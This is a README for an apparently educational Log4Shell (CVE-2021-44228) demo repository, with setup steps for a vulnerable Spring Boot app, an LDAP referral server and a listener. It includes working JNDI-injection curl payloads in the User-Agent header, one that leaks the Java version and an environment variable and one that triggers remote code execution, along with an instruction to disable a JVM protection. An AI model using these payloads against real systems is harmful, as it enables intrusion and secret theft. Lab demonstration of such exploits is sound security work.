## Log4Shell Exploit Demo

🛑 _Code in this repo should be used for educational purposes only!_ 🛑  
🛑 _Do not use these attacks against services which are not under your control!_ 🛑

_Please see [references](#References) for initiating repos with Python samples and further information._

## Purpose

This repo mixes code from repos mentioned in the [references](#References) section to facilitate single language and tech stack (Java/Spring) demo of the exploit. To replay the demo, only Java and Maven have to be installed, though an IDE is recommended.

## Prerequisites

* Java 8+ (for Java8u191+ and Java 11.0+ see _Start_ Todos below)
* Maven 3+
* (Opt.) IntelliJ or Eclipse

## Setup

### Install LDAP Ref Lib locally

* Clone https://github.com/mbechler/marshalsec
* Uncomment the `<artifactId>maven-assembly-plugin</artifactId>` in `pom.xml`
* Install library to local Maven Repo with `mvn clean install`

## Run Demo

### Start Web Application with vulnerable Log4j

* In Folder *vulnerable-spring-boot-web-app* 
* Build with `mvn clean install`
* Run `Log4shellApplication`

_Note: With Java 11 or Java8u191+ (for other Java SDKs see [here](https://www.geekyhacker.com/2021/12/11/three-ways-to-patch-log4shell-cve-2021-44228-vulnerability/)), in Run Configuration, Add VM option `-Dcom.sun.jndi.ldap.object.trustURLCodebase=true`_

### Start Exploit & LDAP Servers

* In folder *l4sexploit*
* Build with `mvn clean install`
* Run `L4sexploitApplication`

### Start Socketlistener

* In folder *l4sexploit*
* Run `ExploitServer`

### Call Exploit

* **Secret Information Exposure**: `curl -A '${jndi:ldap://localhost:1389/javaversion:${java:version}/user:${env:USER}}' http://localhost:9090/`
* **Remote Code Execution (Command & Control)**: `curl -A '${jndi:ldap://localhost:1389/exec}' http://localhost:9090/`

### References

* Log4Shell-POC: https://github.com/kozmer/log4j-shell-poc
* Web Appication: https://github.com/korteke/log4shell-demo
* LDAP Serialization Hack: https://github.com/mbechler/marshalsec

### To use locally generated marshalsec Maven Artifact

```xml
<dependency>
  <groupId>org.eenterphace.mbechler</groupId>
  <artifactId>marshalsec</artifactId>
  <version>0.0.3-SNAPSHOT</version>
</dependency>
```

### It does not work

* Did you add `-Dcom.sun.jndi.ldap.object.trustURLCodebase=true` for newer Java SDKs?
* Did you install the *marshalsec* JAR in your local Maven repo?
* Did you remove/uncomment the assembly Maven plugin when building *marshalsec* JAR?
